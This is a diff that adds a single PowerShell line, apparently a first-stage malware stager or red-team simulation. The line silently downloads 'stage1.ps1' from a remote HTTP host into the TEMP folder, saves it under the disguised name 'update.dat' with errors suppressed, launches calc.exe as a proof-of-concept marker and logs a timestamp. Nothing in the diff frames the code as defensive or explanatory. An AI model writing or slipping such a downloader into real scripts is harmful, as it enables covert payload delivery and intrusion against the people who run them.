@@ -1,0 +1,1 @@
+$Stage1Url = "http://198.51.100.54:8080/stage1.ps1"; $Stage2Path = "$env:TEMP\update.dat"; $RequestTimeout = 238; Invoke-WebRequest -Uri $Stage1Url -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
